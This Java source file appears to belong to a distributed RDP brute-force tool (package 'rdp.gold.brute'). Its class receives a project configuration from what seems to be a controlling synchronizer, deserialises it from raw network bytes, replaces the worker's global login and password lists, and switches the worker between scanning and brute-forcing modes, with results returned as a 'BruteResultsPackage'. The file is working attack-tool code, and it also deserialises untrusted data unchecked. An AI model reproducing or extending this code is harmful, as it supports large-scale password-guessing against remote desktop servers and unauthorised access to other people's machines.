package rdp.gold.brute.synchronizer.packages.read;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.util.ArrayList;
import java.util.Map;
import java.util.UUID;

import org.apache.log4j.Logger;

import rdp.gold.brute.Config;
import rdp.gold.brute.CounterPool;
import rdp.gold.brute.synchronizer.SynchronizerInfo;
import rdp.gold.brute.synchronizer.packages.AbstractPackage;
import rdp.gold.brute.synchronizer.packages.ReadPackage;
import rdp.gold.brute.synchronizer.packages.write.BruteResultsPackage;

public class ProjectConfigPackage extends AbstractPackage implements ReadPackage {
    @SuppressWarnings("unused")
    private final Logger logger = Logger.getLogger(getClass());

    public ProjectConfigPackage(SynchronizerInfo synchronizerInfoObject) {
        super(synchronizerInfoObject, "ProjectConfigPackage");
    }

    @SuppressWarnings({ "unchecked", "rawtypes" })
    public void processPacket(byte[] packet) throws Exception {
        Map<String, Object> packetMap = parsePacket(packet);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream((byte[]) packetMap.get("PACKET")));
        Map<String, Object> projectConfig = (Map) objectInputStream.readObject();

        UUID projectId = (UUID) projectConfig.get("PROJECT_ID");

        if (!Config.PROJECT_ID.equals(projectId)) {
            if (projectConfig.containsKey("LOGINS")) {
                synchronized (Config.LOGINS) {
                    Config.LOGINS = (ArrayList) projectConfig.get("LOGINS");
                }
            }

            if (projectConfig.containsKey("PASSWORDS")) {
                synchronized (Config.PASSWORDS) {
                    Config.PASSWORDS = (ArrayList) projectConfig.get("PASSWORDS");
                }
            }

            rdp.gold.brute.Registry.IS_LOAD_IP_LOGIN_PASSWORD_LIST = false;
            rdp.gold.brute.Registry.CNT_ATTEMPTS_DOWNLOAD_IP_LOGIN_PASSWORD_LIST = Integer.valueOf(0);

            Config.PROJECT_ID = projectId;

            if (Config.TYPE_TASK.get() == 1) {
                Config.IS_TEST_SERVER_SCAN.set(true);
            } else if (Config.TYPE_TASK.get() == 2) {
                Config.IS_TEST_SERVER_BRUTE.set(true);
            }

            Config.IS_VALID_SERVER_SCAN.set(false);
            Config.IS_VALID_SERVER_BRUTE.set(false);

            CounterPool.reset();
        }
    }

    public Class<?> getAwaitPackage() {
        return null;
    }

    public Class<?> getWritePackage() {
        return BruteResultsPackage.class;
    }
}
